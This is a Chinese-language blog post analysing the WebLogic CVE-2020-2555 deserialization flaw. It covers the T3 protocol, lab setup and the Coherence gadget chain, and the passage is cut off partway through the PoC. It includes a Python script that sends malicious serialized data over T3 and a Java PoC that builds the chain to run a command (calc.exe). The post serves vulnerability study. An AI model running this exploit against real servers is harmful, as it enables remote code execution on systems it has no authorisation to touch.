<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/favicon-16x16.png?v=2.1.1" type="image/png" sizes="16x16"><link rel="icon" href="/images/favicon-32x32.png?v=2.1.1" type="image/png" sizes="32x32"><meta name="description" content="漏洞简介                           前置知识 - weblogic T3 协议       WebLogic Server 中的 RMI 通信使用 T3 协议在 WebLogic Server 和其他 Java 程序(包括客户端及其他 WebLogic Server 实例) 间传输数据。在 java rmi 中，默认 rmi 使用的是 jrmp 协议">
<meta property="og:type" content="article">
<meta property="og:title" content="weblogic CVE-2020-2555">
<meta property="og:url" content="http://yoursite.com/2021/01/04/weblogic%20CVE-2020-2555/index.html">
<meta property="og:site_name" content="Whippet&#39;s Blog">
<meta property="og:description" content="漏洞简介                           前置知识 - weblogic T3 协议       WebLogic Server 中的 RMI 通信使用 T3 协议在 WebLogic Server 和其他 Java 程序(包括客户端及其他 WebLogic Server 实例) 间传输数据。在 java rmi 中，默认 rmi 使用的是 jrmp 协议">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://yoursite.com/2021/01/04/weblogic%20CVE-2020-2555/20210105142026.png">
<meta property="og:image" content="http://yoursite.com/2021/01/04/weblogic%20CVE-2020-2555/20210105141335.png">
<meta property="og:image" content="http://yoursite.com/2021/01/04/weblogic%20CVE-2020-2555/20210106105418.png">
<meta property="og:image" content="http://yoursite.com/2021/01/04/weblogic%20CVE-2020-2555/20210105124934.png">
<meta property="og:image" content="http://yoursite.com/2021/01/04/weblogic%20CVE-2020-2555/20210105143721.png">
<meta property="og:image" content="http://yoursite.com/2021/01/04/weblogic%20CVE-2020-2555/20210105145046.png">
<meta property="og:image" content="http://yoursite.com/2021/01/04/weblogic%20CVE-2020-2555/20210105155635.png">
<meta property="og:image" content="http://yoursite.com/2021/01/04/weblogic%20CVE-2020-2555/20210105155923.png">
<meta property="og:image" content="http://yoursite.com/2021/01/04/weblogic%20CVE-2020-2555/20210106150053.png">
<meta property="og:image" content="http://yoursite.com/2021/01/04/weblogic%20CVE-2020-2555/20210107102405.png">
<meta property="og:image" content="http://yoursite.com/2021/01/04/weblogic%20CVE-2020-2555/20210107110425.png">
<meta property="og:image" content="http://yoursite.com/2021/01/04/weblogic%20CVE-2020-2555/20210107110424.png">
<meta property="og:image" content="http://yoursite.com/2021/01/04/weblogic%20CVE-2020-2555/20210107112128.png">
<meta property="og:image" content="http://yoursite.com/2021/01/04/weblogic%20CVE-2020-2555/20210108161413.png">
<meta property="og:image" content="http://yoursite.com/2021/01/04/weblogic%20CVE-2020-2555/20210108155326.png">
<meta property="og:image" content="http://yoursite.com/2021/01/04/weblogic%20CVE-2020-2555/20210107114422.png">
<meta property="og:image" content="http://yoursite.com/2021/01/04/weblogic%20CVE-2020-2555/20210107114533.png">
<meta property="og:image" content="http://yoursite.com/2021/01/04/weblogic%20CVE-2020-2555/20210107164227.png">
<meta property="og:image" content="http://yoursite.com/2021/01/04/weblogic%20CVE-2020-2555/20210108151648.png">
<meta property="article:published_time" content="2021-01-04T06:29:58.000Z">
<meta property="article:modified_time" content="2021-01-08T09:46:40.887Z">
<meta property="article:author" content="whippet">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://yoursite.com/2021/01/04/weblogic%20CVE-2020-2555/20210105142026.png"><title>weblogic CVE-2020-2555 | Whippet's Blog</title><link ref="canonical" href="http://yoursite.com/2021/01/04/weblogic%20CVE-2020-2555/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.1.1"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: undefined,
  back2top: {"enable":true},
  codeblock: {"style":"carbon","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.1.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friendship/"><span class="header-nav-menu-item__icon"><i class="fas fa-link"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Whippet's Blog</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">weblogic CVE-2020-2555</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-01-04</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2021-01-08</span></span></div></header><div class="post-body"><h2 id="漏洞简介">
          <a href="#漏洞简介" class="heading-link"><i class="fas fa-link"></i></a>漏洞简介</h2>
      
        <h2 id="前置知识-weblogic-T3-协议">
          <a href="#前置知识-weblogic-T3-协议" class="heading-link"><i class="fas fa-link"></i></a>前置知识 - weblogic T3 协议</h2>
      <p>WebLogic Server 中的 RMI 通信使用 T3 协议在 WebLogic Server 和其他 Java 程序(包括客户端及其他 WebLogic Server 实例) 间传输数据。在 java rmi 中，默认 rmi 使用的是 jrmp 协议，weblogic 包含高度优化了 rmi 的实现。</p>
<p>简单理解 t3 协议<br><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://cert.360.cn/report/detail?id=0de94a3cd4c71debe397e2c1a036436f">weblogic t3 协议利用与防御</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>  </p>
<p>T3 协议包括  </p>
<ul>
<li>请求包头</li>
<li>请求主体</li>
</ul>
<p>请求包头</p>
<figure class="highlight plain"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">t3 12.2.1</span><br><span class="line">AS:255</span><br><span class="line">HL:19</span><br><span class="line">MS:10000000</span><br><span class="line">PU:t3://us-l-breens:7001</span><br></pre></td></tr></tbody></table></div></figure>
<p>每一行都以 <code>\n</code> 结尾，weblogic 客户端与服务端发送的数据均以 <code>\n\n</code> 结尾。<br>同时，当我们发送 t3 请求包，可以获取服务器 weblogic 版本，服务器会将自身版本响应返回。</p>
<figure class="highlight plain"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HELO:12.1.4.0 false</span><br><span class="line">AS:2048</span><br><span class="line">HL:19</span><br><span class="line">MS:10000000</span><br></pre></td></tr></tbody></table></div></figure>
<p><img src="/2021/01/04/weblogic%20CVE-2020-2555/20210105142026.png"><br><img src="/2021/01/04/weblogic%20CVE-2020-2555/20210105141335.png"></p>
<figure class="highlight python"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">    print(<span class="string">'Usage: python {filename} &lt;host&gt; &lt;port&gt;'</span>.format(filename=os.path.basename(sys.argv[<span class="number">0</span>])))</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">sock.settimeout(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">server_address = (sys.argv[<span class="number">1</span>],int(sys.argv[<span class="number">2</span>]))</span><br><span class="line">print(<span class="string">'[+] Connecting to {host} port {port}'</span>.format(host=sys.argv[<span class="number">1</span>],port=sys.argv[<span class="number">2</span>]))</span><br><span class="line">sock.connect(server_address)</span><br><span class="line"></span><br><span class="line"><span class="comment">## Send Header</span></span><br><span class="line">headers=<span class="string">'t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'sending \n{headers}'</span>.format(headers=headers))</span><br><span class="line">headers = headers.encode() <span class="comment">## python2 和 python3 在套接字返回值解码上有区别。python3是字节流，python2是字符串</span></span><br><span class="line">sock.sendall(headers)</span><br><span class="line"></span><br><span class="line"><span class="comment">## Receiving Response</span></span><br><span class="line">data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">data = data.decode() </span><br><span class="line"><span class="keyword">print</span> (<span class="string">'received \n{data}'</span>.format(data=data))</span><br></pre></td></tr></tbody></table></div></figure>
<p>只有先发送 T3 协议请求头，才能继续发送数据。我们通过仔细查看 T3 协议数据包，通过查看 hex ,发现其中 <code>ac ed 00 05</code> 序列化魔术头存在多处。我们可以将发送的数据包分为多个部分，第一部分和其他各个部分<br><img src="/2021/01/04/weblogic%20CVE-2020-2555/20210106105418.png"><br>第一部分的前四个字节为整个数据包的长度，其他各个部分均为 JAVA 序列化数据。<br>我们想利用 weblogic 的 T3 协议进行反序列化攻击时，我们有两种操作思路 ① 将weblogic 发送的数据中的任意一 JAVA 序列化数据替换为恶意的序列化数据；② 将 weblogic 发送的数据中第一部分与恶意的序列化数据进行拼接。同时，必须先发送 T3 协议头数据包，再发送 JAVA 序列化数据包，才能使 weblogic 进行 JAVA 反序列化进而触发漏洞。如果只发送 JAVA 序列化数据包，不先发送 T3 协议头数据包，无法触发反序列化。</p>
<p>编写一个脚本，能够通过 T3 协议发送 JAVA 恶意序列化数据。</p>
<ul>
<li>建立 socket 请求</li>
<li>发送 T3 协议头数据</li>
<li>读取恶意序列化数据，拼接到第一部分之后</li>
<li>替换数据的前四个字节为第一部分数据+恶意序列化数据的长度</li>
<li>发送恶意数据</li>
</ul>
<figure class="highlight python"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">    print(<span class="string">'Usage: python {filename} &lt;host&gt; &lt;port&gt;'</span>.format(filename=os.path.basename(sys.argv[<span class="number">0</span>])))</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">sock.settimeout(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">server_address = (sys.argv[<span class="number">1</span>],int(sys.argv[<span class="number">2</span>]))</span><br><span class="line">print(<span class="string">'[+] Connecting to {host} port {port}'</span>.format(host=sys.argv[<span class="number">1</span>],port=sys.argv[<span class="number">2</span>]))</span><br><span class="line">sock.connect(server_address)</span><br><span class="line"></span><br><span class="line"><span class="comment">## Send Header</span></span><br><span class="line">headers=<span class="string">'t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'sending \n{headers}'</span>.format(headers=headers))</span><br><span class="line">headers = headers.encode() <span class="comment">## python2 和 python3 在套接字返回值解码上有区别。python3是字节流，python2是字符串</span></span><br><span class="line">sock.sendall(headers)</span><br><span class="line"></span><br><span class="line"><span class="comment">## Receiving Response</span></span><br><span class="line">data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">data = data.decode() </span><br><span class="line"><span class="keyword">print</span> (<span class="string">'received \n{data}'</span>.format(data=data))</span><br><span class="line"></span><br><span class="line"><span class="comment">## 读取恶意序列化数据</span></span><br><span class="line">payloadObj = open(sys.argv[<span class="number">3</span>],<span class="string">'rb'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment">## 第一部分数据</span></span><br><span class="line">payload=<span class="string">'\x00\x00\x09\xf3\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x71\x00\x00\xea\x60\x00\x00\x00\x18\x43\x2e\xc6\xa2\xa6\x39\x85\xb5\xaf\x7d\x63\xe6\x43\x83\xf4\x2a\x6d\x92\xc9\xe9\xaf\x0f\x94\x72\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x70\x06\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x03\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x03\x78\x70\x77\x02\x00\x00\x78\xfe\x01\x00\x00'</span></span><br><span class="line">payload = payload.encode()</span><br><span class="line"><span class="comment">## 拼接第一部分数据+恶意序列化数据</span></span><br><span class="line">payload = payload+payloadObj</span><br><span class="line"></span><br><span class="line"><span class="comment">## 替换前四个字节为数据长度</span></span><br><span class="line">payload = struct.pack(<span class="string">'&gt;I'</span>,len(payload)) + payload[<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment">## 发送恶意数据</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'[+] Sending payload...'</span>)</span><br><span class="line">sock.send(payload)</span><br></pre></td></tr></tbody></table></div></figure>


        <h2 id="环境安装">
          <a href="#环境安装" class="heading-link"><i class="fas fa-link"></i></a>环境安装</h2>
      <p>选用 jdk-8u261<br><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://download.oracle.com/otn/nt/middleware/12c/122140/fmw_12.2.1.4.0_wls_lite_Disk1_1of1.zip?AuthParam=1609813691_7c6ee0683cd4b21526dbafc0423f3775">weblogic 12.1.4.0</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>下载 weblogic 安装包后，以管理员身份打开 cmd 控制台，执行 <code>java -jar fmw_12.2.1.4.0_wls_lite_generic.jar</code>  一路 next 就好。<br>CVE-2020-2555 主要源于 conherence.jar 中存在着反序列化构造的类，并且利用 weblogic 默认存在的 T3 协议进行传输和解析进而导致 weblogic 服务器反序列化恶意代码最后执行攻击语句。<br><img src="/2021/01/04/weblogic%20CVE-2020-2555/20210105124934.png"><br>安装完成之后，启动 <code>C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\startWebLogic.cmd</code> 就可以启动 weblogic。<br><img src="/2021/01/04/weblogic%20CVE-2020-2555/20210105143721.png"></p>
<p>设置调试的话修改 <code>user_project/domains/bin</code>目录中 <code>setDomainEnv.cmd</code> 或者 <code>setDomainEnv.sh</code> 文件，在 <code>if "%debugFlag%"=="true"</code> 前加入 set debugFlag=true<br><img src="/2021/01/04/weblogic%20CVE-2020-2555/20210105145046.png"></p>
<p>在同一文件中 通过 set DEBUG_PORT=8453 指定了远程调试的端口<br>拷贝 Oracle_Home 目录下所有文件至调试目录，并且将 <code>coherence\lib</code> 添加至 Libraries<br><img src="/2021/01/04/weblogic%20CVE-2020-2555/20210105155635.png"></p>
<p>配置 Remote 方式进行远程调试，端口为 8453<br><img src="/2021/01/04/weblogic%20CVE-2020-2555/20210105155923.png"></p>

        <h2 id="漏洞复现">
          <a href="#漏洞复现" class="heading-link"><i class="fas fa-link"></i></a>漏洞复现</h2>
      <p>选用上面构造好的 weblogic T3 脚本，根据版本信息 <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://github.com/0nise/CVE-2020-2555/tree/master/file">https://github.com/0nise/CVE-2020-2555/tree/master/file</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>  选择合适的 java序列化数据</p>
<p><img src="/2021/01/04/weblogic%20CVE-2020-2555/20210106150053.png"></p>

        <h2 id="漏洞分析">
          <a href="#漏洞分析" class="heading-link"><i class="fas fa-link"></i></a>漏洞分析</h2>
      <figure class="highlight plain"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain: （利用链）</span><br><span class="line">        ObjectInputStream.readObject()</span><br><span class="line">            BadAttributeValueExpException.readObject()</span><br><span class="line">                LimitFilter.toString()</span><br><span class="line">                    ChainedExtractor.extract()</span><br><span class="line">                            ReflectionExtractor.extract()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            ReflectionExtractor.extract()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            ReflectionExtractor.extract()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></tbody></table></div></figure>
<p>因为调用链中利用到了 jdk 源代码中的 <code>javax.management.BadAttributeValueExpException</code> ，为了方便调试，我们需要将 jdk 代码加入到项目内部，在jdk 根目录下有 src.zip 加入项目中即可<br><img src="/2021/01/04/weblogic%20CVE-2020-2555/20210107102405.png"></p>
<p>通过查看补丁可以看到将 LimitFilter 类中的 toString() 方法中的 extract() 方法调用全部都移除，我们就可以知道，漏洞的触发位置就在此处。<br><img src="/2021/01/04/weblogic%20CVE-2020-2555/20210107110425.png"><br>在 java 反序列化链 CommonsCollections5 中利用 jdk 中 自带的 BadAttributeValueExpException 来调用任意类的 toString()方法。<br><code>javax.management.BadAttributeValueExpException#readObject</code><br><img src="/2021/01/04/weblogic%20CVE-2020-2555/20210107110424.png"></p>
<p>我们注意到，如果 <code>m_comparator</code> 是继承 <code>ValueExtractor</code> 接口的类时，才会去调用 <code>extract()</code> 方法。同时也将 <code>this.m_oAnchorTop</code> &amp;&amp; <code>this.m_oAnchorBottom</code> 作为参数，传入 <code>ValueExtractor.extract()</code>。<br><code>com.tangosol.util.filter.LimitFilter#toString</code><br><img src="/2021/01/04/weblogic%20CVE-2020-2555/20210107112128.png"><br>跟进类 <code>ValueExtractor</code>，查看 <code>extract()</code> 方法，发现 <code>ValueExtractor</code> 是一个接口的类，并且 <code>extract()</code>  是一个抽象方法，并没有实现。<br><img src="/2021/01/04/weblogic%20CVE-2020-2555/20210108161413.png"><br>因为这个漏洞是一个反序列化漏洞，所以我们需要在 <code>ValueExtractor</code> 的子类中找到实现 <code>Serializable</code>反序列化接口、具有 <code>extract()</code> 方法、在 <code>extract()</code> 方法中实现了命令执行。在 idea 中利用 <code>ctrl + h</code> 查看类或接口的继承关系。<br><img src="/2021/01/04/weblogic%20CVE-2020-2555/20210108155326.png"></p>
<p><img src="/2021/01/04/weblogic%20CVE-2020-2555/20210107114422.png"><br><code>com.tangosol.util.extractor.ReflectionExtractor#extract</code><br><img src="/2021/01/04/weblogic%20CVE-2020-2555/20210107114533.png"><br>我们可以看到 ReflectionExtractor 中的 extract 方法 ，调用了 method.invoke，两个参数都是序列化中的可控变量。不过仅凭单一的 method.invoke 是没有办法调用 <code>Runtime.getRuntime().exec()</code>，需要找一个中间点去反复的调用这个方法，就像 <code>commons-collections-3.1</code> 的 Gadget chain。 ChainedExtractor 的 extract 可以满足这个条件。<br><code>com.tangosol.util.extractor.ChainedExtractor#extract</code><br><img src="/2021/01/04/weblogic%20CVE-2020-2555/20210107164227.png"></p>

        <h3 id="构造-POC">
          <a href="#构造-POC" class="heading-link"><i class="fas fa-link"></i></a>构造 POC</h3>
      <p>创建一个 maven 项目，在项目文件夹下创建一个 lib 文件夹，将 weblogic 服务下 <code>coherence/lib/coherence.jar</code> 拷贝到文件夹下。针对不同版本的weblogic，需要不同版本下的 coherence.jar 。<br><img src="/2021/01/04/weblogic%20CVE-2020-2555/20210108151648.png"></p>
<p>POC</p>
<figure class="highlight java"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.tangosol.util.extractor.ChainedExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.extractor.ReflectionExtractor;</span><br><span class="line"><span class="keyword">import</span> com.tangosol.util.filter.LimitFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2020_2555</span> </span>{</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>{</span><br><span class="line"></span><br><span class="line">        ReflectionExtractor[] extractors = {</span><br><span class="line">                <span class="keyword">new</span> ReflectionExtractor(<span class="string">"getMethod"</span>,<span class="keyword">new</span> Object[]{<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]}),</span><br><span class="line">                <span class="keyword">new</span> ReflectionExtractor(<span class="string">"invoke"</span>, <span class="keyword">new</span> Object[]{<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]}),</span><br><span class="line">                <span class="keyword">new</span> ReflectionExtractor(<span class="string">"exec"</span>,<span class="keyword">new</span> Object[]{<span class="string">"calc.exe"</span>})</span><br><span class="line">        };</span><br><span class="line">        ChainedExtractor chainedExtractor =<span class="keyword">new</span> ChainedExtractor(extractors);</span><br><span class="line">        LimitFilter limitFilter = <span class="keyword">new</span> LimitFilter();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// LimitFilter 类中的成员变量为 private,所以需要通过 setAccessible 来反射获取私有变量</span></span><br><span class="line">        <span class="comment">// Field 反射中 获取类的相关信息 &amp;&amp; 对成员变量重新赋值</span></span><br><span class="line">        <span class="comment">//m_comparator</span></span><br><span class="line">        Field m_comparator = limitFilter.getClass().getDeclaredField(<span class="string">"m_comparator"</span>);</span><br><span class="line">        m_comparator.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        m_comparator.set(limitFilter, chainedExtractor);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//m_oAnchorTop</span></span><br><span class="line">        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField(<span class="string">"m_oAnchorTop"</span>);</span><br><span class="line">        m_oAnchorTop.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        m_oAnchorTop.set(limitFilter,Runtime.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// val</span></span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException, limitFilter);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化数据</span></span><br><span class="line">        